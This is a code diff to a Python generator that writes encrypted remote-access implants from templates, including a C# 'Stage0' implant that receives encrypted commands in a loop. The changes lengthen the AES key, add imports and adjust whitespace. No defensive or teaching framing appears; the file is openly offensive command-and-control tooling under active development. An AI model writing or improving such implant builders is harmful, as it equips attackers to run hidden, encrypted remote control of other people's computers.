@@ -4,6 +4,8 @@ import json
 import os
 import random
 import string
+import subprocess
+import sys
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
 import base64
@@ -19,8 +21,8 @@ class ImplantGenerator:
             os.makedirs(self.output_dir)
     
     def generate_key(self):
-        """Generate a random AES-256 key"""
-        return ''.join(random.choices('0123456789abcdef', k=32))
+        """Generate a random AES-256 key (32 bytes = 64 hex chars)"""
+        return ''.join(random.choices('0123456789abcdef', k=64))
     
     def generate_iv(self):
         """Generate a random AES IV"""
@@ -319,7 +321,7 @@ class Stage0
                         string cmd = Decrypt(input.ToString()).Trim();
                         
                         if (cmd.ToUpper() == "EXIT")
-                        {{
+                       {{
                             string bye = Encrypt("[!] Implant exiting. Goodbye!\\n");
                             writer.WriteLine(bye);
                             break;
@@ -422,21 +424,17 @@ class Stage0
         """Generate implant in specified language"""
         if language not in self.templates:
             raise ValueError(f"Unsupported language: {language}")
-        
         # Generate random keys if not provided
         if 'key' not in config:
             config['key'] = self.generate_key()
         if 'iv' not in config:
             config['iv'] = self.generate_iv()
-        
         # Update server.py with new keys if requested
         if update_server:
             if self.update_server_keys(config):
                 print("[+] Updated server.py with new encryption keys")
-        
         # Generate the implant
         implant_code = self.templates[language](config)
-        
         # Determine output filename
         if not output_file:
             extensions = {
@@ -444,18 +442,15 @@ class Stage0
                 'csharp': '.cs'
             }
             output_file = f"implant_{language}{extensions[language]}"
-        
         # Write to file
         output_path = os.path.join(self.output_dir, output_file)
         with open(output_path, 'w') as f:
             f.write(implant_code)
-        
         # Create config file
         config_file = output_file.replace('.', '_') + '_config.json'
         config_path = os.path.join(self.output_dir, config_file)
         with open(config_path, 'w') as f:
             json.dump(config, f, indent=2)
-        
         return output_path, config_path
 
     def generate_all(self, config, output_prefix=None, update_server=True):
